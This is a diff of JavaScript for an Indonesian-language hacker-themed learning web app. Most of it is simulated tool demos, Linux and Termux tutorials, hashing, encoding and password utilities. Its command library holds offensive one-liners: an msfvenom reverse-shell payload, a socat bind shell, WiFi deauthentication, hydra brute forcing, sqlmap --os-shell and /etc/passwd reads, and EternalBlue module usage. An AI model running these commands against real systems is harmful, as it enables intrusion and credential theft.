+  {i:'🌐',n:'IP Tracer',d:'Trace route',f:async function(){ for(let i=1;i<=8;i++){ wT('    ' + i + '  ' + rip() + '  ' + ri(2,180) + 'ms','dim'); await slp(150); } wT('[✓] Located.','ok'); goT(); }},
+  {i:'🔑',n:'Hash Generator',d:'SHA-256 asli',f:async function(){ const t=prompt('Teks:','AdrianHackMul'); if(t==null)return; const e=new TextEncoder().encode(t); const b=await crypto.subtle.digest('SHA-256',e); const h=Array.from(new Uint8Array(b)).map(function(x){ return x.toString(16).padStart(2,'0'); }).join(''); wT('[✓] SHA-256: ' + h,'ok'); goT(); }},
+  {i:'📁',n:'File Encryptor',d:'XOR cipher',f:async function(){ const t=prompt('Teks:','rahasia'); if(t==null)return; const k='ADRIAN'; let o=''; for(let i=0;i<t.length;i++) o+=String.fromCharCode(t.charCodeAt(i)^k.charCodeAt(i%k.length)); const hx=Array.from(o).map(function(c){ return c.charCodeAt(0).toString(16).padStart(2,'0'); }).join(''); wT('[✓] Cipher: ' + hx,'ok'); goT(); }},
+  {i:'💻',n:'System Monitor',d:'CPU/RAM fake',f:function(){ let i=0; const t=setInterval(function(){ wT('    CPU ' + ri(10,90) + '% | RAM ' + ri(30,85) + '% | TEMP ' + ri(40,75) + '°C','info'); if(++i>=8){ clearInterval(t); wT('[✓] End.','ok'); } },500); goT(); }},
+  {i:'🎯',n:'Exploit Sim',d:'Log bertahap',f:async function(){ const steps=['Recon ....... DONE','Exploit ..... DONE','Privesc ...... DONE']; for(let i=0;i<steps.length;i++){ wT('    ' + steps[i],'warn'); await slp(220); } wT('[✓] Simulated','ok'); S.ok(); goT(); }},
+  {i:'🧬',n:'DNA Vault',d:'Encode DNA',f:function(){ const t=prompt('Teks:','HACK'); if(t==null)return; const m={A:'00',C:'01',G:'10',T:'11'}; let o=''; for(let j=0;j<t.length;j++){ const b=t.charCodeAt(j).toString(2).padStart(8,'0'); for(let i=0;i<8;i+=2){ const pair=b.substr(i,2); for(const k in m){ if(m[k]===pair) o+=k; } } } wT('[✓] DNA: ' + o,'ok'); goT(); }},
+  {i:'📊',n:'Traffic Analyzer',d:'Bar chart',f:function(){ let i=0; const t=setInterval(function(){ wT('    ' + String(i).padStart(2) + ': ' + '█'.repeat(ri(1,40)) + ' ' + ri(50,900) + ' pkts','dim'); if(++i>=10){ clearInterval(t); wT('[✓] Done.','ok'); } },250); goT(); }},
+  {i:'📚',n:'Command Library',d:'400+ perintah',f:function(){ go('commands'); }}
+];
+const tGrid = $('#toolsGrid');
+TOOLS.forEach(function(t){
+  const c = document.createElement('div');
+  c.className = 'tool';
+  c.innerHTML = '<div class="tool-i">' + t.i + '</div><div class="tool-n">' + t.n + '</div><div class="tool-d">' + t.d + '</div>';
+  c.onclick = function(){ S.init(); S.click(); t.f(); toast('▶ ' + t.n); };
+  tGrid.appendChild(c);
+});
+
+/* LEARN */
+const LEARN = [
+  {i:'🐧',t:'Dasar Linux',d:'Navigasi, file, permission',lvl:'beginner',content:'<h4>Navigasi</h4><pre>pwd\nls -la\ncd /home/user\ncd ..</pre><h4>File</h4><pre>mkdir folder\ntouch file.txt\ncp file1 file2\nmv old new\nrm -rf folder/</pre><div class="tip">💡 Gunakan man [command]</div>'},
+  {i:'📱',t:'Termux Setup',d:'Install Termux & dasar',lvl:'beginner',content:'<h4>Update</h4><pre>pkg update && pkg upgrade -y</pre><h4>Storage</h4><pre>termux-setup-storage</pre><h4>Paket Dasar</h4><pre>pkg install git python nano curl wget -y</pre>'},
+  {i:'🌐',t:'Scanning Jaringan',d:'Nmap, ping, traceroute',lvl:'intermediate',content:'<h4>Nmap Dasar</h4><pre>nmap -sV target.com\nnmap -p 1-1000 target\nnmap -sS -A 192.168.1.1</pre><div class="warn">⚠ Scanning tanpa izin = ILEGAL</div>'},
+  {i:'🔐',t:'Kriptografi Dasar',d:'Hash, enkripsi, base64',lvl:'intermediate',content:'<h4>Hash</h4><pre>echo -n "hello" | md5sum\necho -n "hello" | sha256sum</pre><h4>Base64</h4><pre>echo -n "secret" | base64\necho "c2VjcmV0" | base64 -d</pre>'},
+  {i:'🕸️',t:'Web Security',d:'OWASP basics',lvl:'advanced',content:'<h4>OWASP Top 10</h4><ul><li>SQL Injection</li><li>XSS</li><li>CSRF</li><li>Broken Auth</li></ul><div class="warn">⚠ Gunakan hanya di lab legal</div>'},
+  {i:'🐍',t:'Python Security',d:'Script dasar automation',lvl:'intermediate',content:'<h4>Socket Scanner</h4><pre>import socket\nfor port in range(20, 100):\n    s = socket.socket()\n    s.settimeout(0.5)\n    if s.connect_ex(("127.0.0.1", port)) == 0:\n        print(f"[OPEN] {port}")</pre>'},
+  {i:'🛡️',t:'Kali Linux Tools',d:'Tools utama Kali',lvl:'intermediate',content:'<h4>Tools Populer</h4><ul><li>nmap — Network scanner</li><li>metasploit — Exploit framework</li><li>hydra — Brute-force</li><li>john — Password cracker</li><li>aircrack-ng — WiFi auditing</li><li>wireshark — Packet analyzer</li><li>burpsuite — Web proxy</li><li>sqlmap — SQL injection</li></ul>'},
+  {i:'🔒',t:'Ethical Hacking',d:'Roadmap belajar',lvl:'beginner',content:'<h4>Roadmap</h4><ol><li>Linux Fundamentals — 1-2 bulan</li><li>Networking (TCP/IP) — 1 bulan</li><li>Programming (Python) — 2 bulan</li><li>Web Technologies — 1 bulan</li><li>Cryptography Basics — 1 bulan</li><li>Practice: TryHackMe, HackTheBox</li><li>Sertifikasi: CEH, OSCP, eJPT</li></ol><div class="warn">⚠ Jangan scan sistem orang lain.</div>'}
+];
+const learnGrid = $('#learnGrid');
+LEARN.forEach(function(x){
+  const c = document.createElement('div');
+  c.className = 'learn-card';
+  c.innerHTML = '<div class="learn-icon">' + x.i + '</div><div class="learn-title">' + x.t + '</div><div class="learn-desc">' + x.d + '</div><span class="learn-level level-' + x.lvl + '">' + x.lvl.toUpperCase() + '</span>';
+  c.onclick = function(){
+    S.click();
+    $('#modalTitle').textContent = x.t;
+    $('#modalBody').innerHTML = x.content;
+    $('#modal').classList.add('show');
+    setTimeout(function(){
+      $$('#modalBody pre').forEach(function(p){ p.onclick = function(){ if(navigator.clipboard) navigator.clipboard.writeText(p.textContent); toast('📋 Copied!'); }; });
+    }, 50);
+  };
+  learnGrid.appendChild(c);
+});
+$('#modal').onclick = function(e){ if(e.target.id === 'modal') $('#modal').classList.remove('show'); };
+
+/* COMMAND LIBRARY */
+const CMD_DB = [];
+function add(cat, cmd, desc){ CMD_DB.push({cat:cat, cmd:cmd, desc:desc || cmd}); }
+[['pkg update','Update repositori'],['pkg upgrade','Upgrade paket'],['pkg install git','Install git'],['pkg install python','Install Python'],['pkg install nodejs','Install Node.js'],['pkg install nmap','Install nmap'],['pkg uninstall pkg','Uninstall'],['pkg list-installed','List terinstall'],['pkg search php','Cari paket'],['pkg clean','Bersihkan cache'],['termux-setup-storage','Setup storage'],['termux-wake-lock','Cegah sleep'],['termux-info','Info Termux'],['termux-open file.pdf','Buka file'],['termux-share file','Share file'],['termux-clipboard-get','Clipboard'],['termux-toast Halo','Toast'],['termux-vibrate','Getarkan'],['termux-battery-status','Baterai'],['termux-location','GPS'],['termux-camera-photo o.jpg','Foto'],['termux-sms-list','SMS list'],['termux-notification -t X','Notifikasi'],['ls ~','List home'],['cd /sdcard','Masuk storage'],['cp -r src dst','Copy rekursif'],['chmod +x script.sh','Execute'],['sh script.sh','Jalankan'],['python script.py','Python'],['node script.js','Node'],['clear','Bersihkan'],['history','Riwayat'],['whoami','User'],['uname -a','Kernel'],['df -h','Disk'],['free -h','Memory'],['top','Monitor'],['ps aux','Proses'],['kill -9 PID','Kill'],['ifconfig','Jaringan'],['netstat -tuln','Ports'],['ping -c 4 8.8.8.8','Ping'],['traceroute google.com','Trace'],['nslookup google.com','DNS'],['wget file.zip','Download'],['curl -O url','Curl'],['git clone URL','Clone'],['git pull','Update'],['git status','Status'],['git commit -m "msg"','Commit'],['git push','Push'],['ssh user@host','SSH'],['ssh-keygen','SSH key'],['scp file user@host:','SCP'],['tar -czf out.tar.gz dir','Create tar'],['tar -xzf file.tar.gz','Extract'],['zip -r out.zip dir','Zip'],['unzip file.zip','Unzip'],['grep "kata" file','Grep'],['find . -name "*.txt"','Find'],['man ls','Manual'],['pip install requests','Pip'],['npm install -g pkg','Npm'],['python -m http.server 8000','HTTP server']].forEach(function(t){ add('termux', t[0], t[1]); });
+[['msfconsole','Metasploit'],['msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f elf -o shell.elf','Payload ELF'],['nmap -sV -sC -O target','Scan lengkap'],['nmap -Pn -p- target','Full port'],['nmap --script vuln target','Vuln'],['airmon-ng start wlan0','Monitor WiFi'],['airodump-ng wlan0mon','Capture'],['aireplay-ng --deauth 10 -a BSSID wlan0mon','Deauth'],['aircrack-ng -w wordlist cap.cap','Crack WPA'],['wifite','Auto audit'],['hydra -l admin -P pass.txt 10.0.0.1 ssh','Brute SSH'],['john --wordlist=rockyou.txt hash.txt','John'],['hashcat -m 1000 hash.txt wl.txt','Hashcat'],['sqlmap -u "http://t/?id=1" --dbs','SQLMap'],['nikto -h http://target','Nikto'],['gobuster dir -u http://t -w wl.txt','Gobuster'],['wpscan --url http://t --enumerate u','WPScan'],['whatweb http://t','Fingerprint'],['whois domain.com','Whois'],['dnsrecon -d domain.com','DNS recon'],['theHarvester -d domain.com -b all','Harvester'],['sublist3r -d domain.com','Subdomain'],['amass enum -d domain.com','Amass'],['burpsuite','Burp'],['zaproxy','ZAP'],['ettercap -G','Ettercap'],['bettercap -iface eth0','Bettercap'],['mitmproxy -p 8080','MITM'],['wireshark','Wireshark'],['tcpdump -i eth0 -w cap.pcap','Tcpdump'],['responder -I eth0','Responder'],['crackmapexec smb target','CME SMB'],['smbclient -L //target','SMB'],['enum4linux target','Enum'],['nuclei -u http://t -t cves/','Nuclei'],['masscan -p1-65535 10.0.0.0/24 --rate=1000','Masscan'],['rustscan -a 10.0.0.1','RustScan'],['nc -lvnp 4444','Netcat listen'],['socat TCP-LISTEN:4444,fork EXEC:/bin/bash','Socat'],['chisel server -p 8080 --reverse','Chisel'],['searchsploit apache 2.4','Exploit DB'],['setoolkit','SET'],['beef-xss','BeEF']].forEach(function(t){ add('kali', t[0], t[1]); });
+[['ls','List'],['ls -la','Detail'],['cd /path','Ganti dir'],['pwd','Print cwd'],['mkdir newdir','Buat dir'],['rmdir dir','Hapus dir'],['rm -rf dir','Hapus rekursif'],['cp src dst','Copy'],['mv src dst','Move'],['touch file','Buat file'],['cat file','Baca'],['less file','Pager'],['head file','10 awal'],['tail file','10 akhir'],['tail -f log','Monitor'],['nano file','Nano'],['vim file','Vim'],['echo "hi"','Print'],['grep "x" file','Grep'],['find / -name file','Find'],['locate file','Locate'],['which cmd','Which'],['file file','File'],['stat file','Stat'],['du -sh dir','Disk usage'],['top','Top'],['ps aux','Ps'],['kill -9 PID','Kill'],['chmod 755 file','Chmod'],['chown user file','Chown'],['sudo cmd','Sudo'],['useradd user','Add user'],['passwd user','Password'],['groups user','Groups'],['whoami','Who'],['uname -a','Uname'],['hostname','Hostname'],['date','Date'],['cal','Cal'],['history','History'],['env','Env'],['export VAR=val','Export'],['tar -czf out.tar.gz dir','Tar'],['zip -r out.zip dir','Zip'],['rsync -av src dst','Rsync'],['scp file host:','SCP'],['ssh user@host','SSH'],['crontab -e','Cron'],['systemctl status svc','Systemctl'],['mount','Mount'],['lsblk','Lsblk'],['dd if=/dev/zero of=file bs=1M count=100','DD'],['ln -s target link','Symlink'],['wc -l file','Count'],['sort file','Sort'],['uniq -c','Unique'],['cut -d: -f1 file','Cut'],['awk "{print $1}" file','Awk'],['diff a b','Diff'],['md5sum file','MD5'],['sha256sum file','SHA256'],['base64 file','Base64'],['xxd file','XXD'],['strings binary','Strings'],['curl url','Curl'],['wget url','Wget'],['dig domain','Dig'],['ping -c 4 host','Ping'],['ss -tuln','SS'],['ip a','IP'],['lscpu','CPU'],['lsusb','USB'],['reboot','Reboot'],['poweroff','Poweroff']].forEach(function(t){ add('linux', t[0], t[1]); });
+[['ifconfig eth0 192.168.1.10','Set IP'],['ip addr add 192.168.1.10/24 dev eth0','Add IP'],['iptables -L','Rules'],['iptables -A INPUT -p tcp --dport 22 -j ACCEPT','Allow SSH'],['ufw enable','Enable UFW'],['ufw allow 22/tcp','Allow port'],['tcpdump -i eth0','Capture'],['nmap -sn 192.168.1.0/24','Ping sweep'],['nmap -sV -p 1-1000 host','Service'],['nmap -O host','OS detect'],['nmap -A host','Aggressive'],['arp-scan --localnet','ARP scan'],['smbclient -L //host','SMB'],['responder -I eth0 -wrf','Responder'],['macchanger -r eth0','MAC'],['iw dev wlan0 scan','WiFi'],['nmcli dev wifi list','List WiFi'],['curl -x proxy:8080 url','Proxy'],['proxychains cmd','Chain'],['tor','Tor'],['openvpn config.ovpn','VPN'],['ssh -D 1080 user@host','SOCKS'],['ssh -L 8080:localhost:80 user@host','Local fwd'],['ssh -R 8080:localhost:80 user@host','Remote fwd']].forEach(function(t){ add('network', t[0], t[1]); });
+[['curl -I http://target','Headers'],['curl -X POST -d "a=1" http://t','POST'],['curl -H "Auth: Bearer x" http://t','Bearer'],['curl -b "s=x" http://t','Cookie'],['curl -L http://t','Redirect'],['curl -k https://t','Skip SSL'],['wget -r -l 3 http://t','Recursive'],['wget -m http://t','Mirror'],['nikto -h http://t','Nikto'],['gobuster dir -u http://t -w wl.txt','Gobuster'],['dirb http://t wl.txt','Dirb'],['wfuzz -c -z file,wl.txt http://t/FUZZ','Wfuzz'],['ffuf -u http://t/FUZZ -w wl.txt','FFUF'],['sqlmap -u "http://t?id=1" --dbs','SQLMap'],['wpscan --url http://t --enumerate u','WPScan'],['nuclei -u http://t','Nuclei'],['whatweb http://t','Fingerprint'],['wafw00f http://t','WAF'],['httpx -u http://t','HTTPx'],['subfinder -d t.com','Subfinder'],['amass enum -d t.com','Amass'],['burpsuite','Burp'],['zaproxy','ZAP'],['xsstrike -u http://t','XSS'],['dalfox url http://t','Dalfox'],['commix --url=http://t','Command inj'],['jwt_tool token','JWT'],['hydra -l admin -P wl.txt http-post-form "/login:u=^USER^&p=^PASS^:F=err"','Hydra web']].forEach(function(t){ add('web', t[0], t[1]); });
+[['openssl enc -aes-256-cbc -salt -in file -out file.enc','AES encrypt'],['openssl enc -d -aes-256-cbc -in file.enc -out file','AES decrypt'],['openssl genrsa -out key.pem 4096','RSA key'],['openssl rsa -in key.pem -pubout -out pub.pem','RSA pub'],['openssl req -new -key key.pem -out req.csr','CSR'],['openssl dgst -sha256 file','SHA256'],['openssl dgst -sha256 -sign key.pem -out sig file','Sign'],['openssl passwd -6 password','SHA512 crypt'],['openssl rand -base64 32','Random'],['gpg --gen-key','GPG'],['gpg -e -r user file','Encrypt'],['gpg -d file.gpg','Decrypt'],['ssh-keygen -t ed25519','Ed25519'],['md5sum file','MD5'],['sha1sum file','SHA1'],['sha256sum file','SHA256'],['sha512sum file','SHA512'],['base64 file','Base64'],['xxd -r -p hex.txt','Hex to bin'],['john --format=raw-md5 hash','John'],['hashcat -m 0 hash wl.txt','Hashcat MD5'],['hashcat -m 1000 hash wl.txt','Hashcat NTLM'],['hashcat -m 22000 hash wl.txt','Hashcat WPA'],['hashid hash','Identify']].forEach(function(t){ add('crypto', t[0], t[1]); });
+['exploit/windows/smb/ms17_010_eternalblue','exploit/windows/smb/ms08_067_netapi','exploit/multi/http/apache_mod_cgi_bash_env_exec','exploit/unix/webapp/php_eval'].forEach(function(e){
+  add('metasploit', 'use ' + e, 'Use ' + e);
+  ['set RHOSTS 10.0.0.1','set LHOST 10.0.0.10','set LPORT 4444','exploit -j','check','show options','sessions -l'].forEach(function(o){ add('metasploit', 'use ' + e + ' && ' + o, 'On ' + e + ': ' + o); });
+});
+['-sS','-sT','-sU','-sn','-Pn','-O','-A','-v','-F','-sV','-sC','--script vuln','-T2','-T3','-T4','-n','-p 22','-p 80','-p 443','-p 1-100','-p 1-1000','-p-','--top-ports 100','-oN out.txt','-oX out.xml'].forEach(function(f){ add('nmap', 'nmap ' + f + ' target', 'Nmap ' + f); });
+['ssh','ftp','rdp','smb','mysql','vnc','telnet','smtp'].forEach(function(s){ ['-l admin','-L users.txt','-p password','-P pass.txt','-t 4','-V'].forEach(function(o){ add('hydra', 'hydra ' + o + ' 10.0.0.1 ' + s, 'Hydra ' + s + ' ' + o); }); });
+['--dbs','--tables','--columns','--dump','--os-shell','--file-read=/etc/passwd','--users','--passwords','--batch','--level=5','--risk=3'].forEach(function(o){ add('sqlmap', 'sqlmap -u "http://t/?id=1" ' + o, 'SQLMap ' + o); });
+['GET','POST','PUT','DELETE'].forEach(function(m){ ['-k','-L','-v','-s','-I','-A "Mozilla/5.0"','-H "X: 1"','-u u:p','--data "a=1"','-b "c=1"','-x proxy:8080'].forEach(function(o){ add('curl', 'curl -X ' + m + ' ' + o + ' http://t', 'Curl ' + m + ' ' + o); }); });
+
+$('#cmdBadge').textContent = CMD_DB.length > 999 ? Math.round(CMD_DB.length/1000) + 'K' : CMD_DB.length;
+
+let curCat = 'all', curQuery = '';
+const cats = ['all','termux','kali','linux','network','web','crypto','metasploit','nmap','hydra','sqlmap','curl'];
+const catNames = {all:'SEMUA',termux:'📱 TERMUX',kali:'🐉 KALI',linux:'🐧 LINUX',network:'🌐 NETWORK',web:'🕸️ WEB',crypto:'🔐 CRYPTO',metasploit:'💥 MSF',nmap:'🔍 NMAP',hydra:'💧 HYDRA',sqlmap:'💉 SQLMAP',curl:'🌊 CURL'};
+const catEl = $('#cmdCats');
+cats.forEach(function(c){
+  const b = document.createElement('button');
+  b.className = 'cat-btn' + (c === 'all' ? ' active' : '');
+  b.textContent = catNames[c];
+  b.onclick = function(){ S.click(); $$('.cat-btn').forEach(function(x){ x.classList.remove('active'); }); b.classList.add('active'); curCat = c; renderCmds(); };
+  catEl.appendChild(b);
+});
+const listEl = $('#cmdList');
+function renderCmds(){
+  const q = curQuery.toLowerCase();
+  const filtered = CMD_DB.filter(function(x){
+    return (curCat === 'all' || x.cat === curCat) && (!q || x.cmd.toLowerCase().indexOf(q) !== -1 || x.desc.toLowerCase().indexOf(q) !== -1);
+  });
+  $('#cmdCount').textContent = filtered.length + ' / ' + CMD_DB.length;
+  if(!filtered.length){ listEl.innerHTML = '<div class="cmd-empty">❌ Tidak ada yang cocok</div>'; return; }
+  const display = filtered.slice(0, 300);
+  listEl.innerHTML = display.map(function(x){
+    return '<div class="cmd-item"><span class="cmd-badge">' + x.cat.toUpperCase() + '</span><div class="cmd-name">' + esc(x.cmd) + '</div><div class="cmd-desc">' + esc(x.desc) + '</div><div class="cmd-example" data-cmd="' + esc(x.cmd) + '">' + esc(x.cmd) + '</div></div>';
+  }).join('');
+  $$('.cmd-example').forEach(function(el){
+    el.onclick = function(){ const c = el.dataset.cmd; if(navigator.clipboard) navigator.clipboard.writeText(c); toast('📋 Copied: ' + c.slice(0,30) + '...'); S.click(); };
+  });
+}
+$('#cmdSearch').oninput = function(e){ curQuery = e.target.value; renderCmds(); };
+renderCmds();
+
+/* UTILS */
+$('#pwLen').oninput = function(e){ $('#pwLenV').textContent = e.target.value; };
+$('#pwGen').onclick = function(){
+  S.click();
+  const len = parseInt($('#pwLen').value);
+  let chars = '';
+  if($('#pwUpper').checked) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  if($('#pwLower').checked) chars += 'abcdefghijklmnopqrstuvwxyz';
+  if($('#pwNum').checked) chars += '0123456789';
+  if($('#pwSym').checked) chars += '!@#$%^&*()_+-=[]{}|;:,.<>?';
+  if(!chars) chars = 'abcdefghijklmnopqrstuvwxyz';
+  let out = '';
+  const arr = new Uint32Array(len);
+  crypto.getRandomValues(arr);
+  for(let i=0;i<len;i++) out += chars[arr[i] % chars.length];
+  $('#pwOut').textContent = out;
+  unlock('🔑', 'Password Architect');
+};
+$('#pwOut').onclick = function(){ const t = $('#pwOut').textContent; if(t && t.indexOf('Klik') !== 0){ if(navigator.clipboard) navigator.clipboard.writeText(t); toast('📋 Copied!'); } };
+$('#strIn').oninput = function(e){
+  const pw = e.target.value;
+  if(!pw){ $('#strBar').style.width = '0'; $('#strLabel').textContent = 'Menunggu input...'; return; }
+  let s = 0;
+  if(pw.length >= 8) s++;
+  if(pw.length >= 12) s++;
+  if(pw.length >= 16) s++;
+  if(/[a-z]/.test(pw)) s++;
+  if(/[A-Z]/.test(pw)) s++;
+  if(/[0-9]/.test(pw)) s++;
+  if(/[^A-Za-z0-9]/.test(pw)) s++;
+  if(/^(123|abc|qwe|password|admin)/i.test(pw)) s = Math.max(1, s - 3);
+  const pct = Math.min(100, (s/7) * 100);
+  $('#strBar').style.width = pct + '%';
+  let l, c;
+  if(pct < 30){ l = 'SANGAT LEMAH'; c = 'var(--danger)'; }
+  else if(pct < 50){ l = 'LEMAH'; c = 'var(--danger)'; }
+  else if(pct < 70){ l = 'SEDANG'; c = 'var(--warning)'; }
+  else if(pct < 90){ l = 'KUAT'; c = 'var(--primary)'; }
+  else { l = 'SANGAT KUAT ✓'; c = 'var(--accent)'; unlock('💪','Fortress Password'); }
+  $('#strBar').style.background = c;
+  $('#strLabel').textContent = l;
+  $('#strLabel').style.color = c;
+};
+function md5(str){
+  function cmn(q,a,b,x,s,t){a=a+q+x+t;return((a<<s)|(a>>> (32-s)))+b|0;}
+  function ff(a,b,c,d,x,s,t){return cmn((b&c)|((~b)&d),a,b,x,s,t);}
+  function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&(~d)),a,b,x,s,t);}
+  function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
+  function ii(a,b,c,d,x,s,t){return cmn(c^(b|(~d)),a,b,x,s,t);}
+  function md51(s){
+    var n=s.length,state=[1732584193,-271733879,-1732584194,271733878],i;
+    for(i=64;i<=n;i+=64) md5cycle(state,md5blk(s.substring(i-64,i)));
+    s=s.substring(i-64); var tail=Array(16).fill(0);
+    for(i=0;i<s.length;i++) tail[i>>2]|=s.charCodeAt(i)<<((i%4)<<3);
+    tail[i>>2]|=0x80<<((i%4)<<3);
+    if(i>55){md5cycle(state,tail);tail=Array(16).fill(0);}
+    tail[14]=n*8; md5cycle(state,tail); return state;
+  }
+  function md5cycle(x,k){
+    var a=x[0],b=x[1],c=x[2],d=x[3];
+    a=ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
+    a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
+    a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
+    a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
+    a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
+    a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
+    a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
+    a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
+    a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
+    a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
+    a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
+    a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
+    a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
+    a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
+    a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
+    a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
+    x[0]=a+x[0]|0;x[1]=b+x[1]|0;x[2]=c+x[2]|0;x[3]=d+x[3]|0;
+  }
+  function md5blk(s){var i,md5blks=[];for(i=0;i<64;i+=4)md5blks[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24);return md5blks;}
+  function rhex(n){var j,s='',hex_chr='0123456789abcdef';for(j=0;j<4;j++)s+=hex_chr[(n>>(j*8+4))&0x0F]+hex_chr[(n>>(j*8))&0x0F];return s;}
+  function hex(x){for(var i=0;i<x.length;i++)x[i]=rhex(x[i]);return x.join('');}
+  return hex(md51(unescape(encodeURIComponent(str))));
+}
+async function hashGen(){
+  const txt = $('#hashIn').value;
+  const algo = $('#hashAlgo').value;
+  if(!txt){ $('#hashOut').textContent = 'Input kosong'; return; }
+  try{
+    let hex;
+    if(algo === 'MD5'){
+      hex = md5(txt);
+    } else {
+      const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(txt));
+      hex = Array.from(new Uint8Array(buf)).map(function(b){ return b.toString(16).padStart(2,'0'); }).join('');
+    }
+    $('#hashOut').textContent = hex;
+    unlock('#️⃣','Hash Master');
+  } catch(e){ $('#hashOut').textContent = 'Error: ' + e.message; }
+}
+$('#hashGo').onclick = function(){ S.click(); hashGen(); };
+$('#hashIn').oninput = hashGen;
+$('#hashOut').onclick = function(){ const t = $('#hashOut').textContent; if(t && t.indexOf('Menunggu') !== 0){ if(navigator.clipboard) navigator.clipboard.writeText(t); toast('📋 Copied!'); } };
+$('#encBtn').onclick = function(){
+  S.click();
+  const t = $('#encType').value;
+  const txt = $('#encIn').value;
+  let o = '';
+  try{
+    if(t === 'base64') o = btoa(unescape(encodeURIComponent(txt)));
+    else if(t === 'url') o = encodeURIComponent(txt);
+    else if(t === 'hex') o = Array.from(new TextEncoder().encode(txt)).map(function(b){ return b.toString(16).padStart(2,'0'); }).join('');
+    else if(t === 'rot13') o = txt.replace(/[a-zA-Z]/g, function(c){ return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26); });
+    else if(t === 'binary') o = Array.from(new TextEncoder().encode(txt)).map(function(b){ return b.toString(2).padStart(8,'0'); }).join(' ');
+    else if(t === 'reverse') o = txt.split('').reverse().join('');
+    $('#encOut').textContent = o;
+  } catch(e){ $('#encOut').textContent = 'Error: ' + e.message; }
+};
+$('#decBtn').onclick = function(){
+  S.click();
+  const t = $('#encType').value;
+  const txt = $('#encIn').value.trim();
+  let o = '';
+  try{
+    if(t === 'base64') o = decodeURIComponent(escape(atob(txt)));
+    else if(t === 'url') o = decodeURIComponent(txt);
+    else if(t === 'hex') o = new TextDecoder().decode(new Uint8Array(txt.match(/.{1,2}/g).map(function(h){ return parseInt(h,16); })));
+    else if(t === 'rot13') o = txt.replace(/[a-zA-Z]/g, function(c){ return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26); });
+    else if(t === 'binary') o = new TextDecoder().decode(new Uint8Array(txt.split(/\s+/).map(function(b){ return parseInt(b,2); })));
+    else if(t === 'reverse') o = txt.split('').reverse().join('');
+    $('#encOut').textContent = o;
+  } catch(e){ $('#encOut').textContent = 'Error: ' + e.message; }
+};
+$('#uuidGen').onclick = function(){
+  S.click();
+  $('#uuidOut').textContent = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c){
+    const rr = crypto.getRandomValues(new Uint8Array(1))[0] % 16;
+    const v = c === 'x' ? rr : (rr & 0x3 | 0x8);
+    return v.toString(16);
+  });
+  unlock('🆔','UUID Generator');
+};
+$('#uuidBatch').onclick = function(){
+  S.click();
+  const arr = [];
+  for(let i=0;i<10;i++){
+    arr.push('xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c){
+      const rr = crypto.getRandomValues(new Uint8Array(1))[0] % 16;
+      return (c === 'x' ? rr : (rr & 0x3 | 0x8)).toString(16);
+    }));
+  }
+  $('#uuidOut').textContent = arr.join('\n');
+};
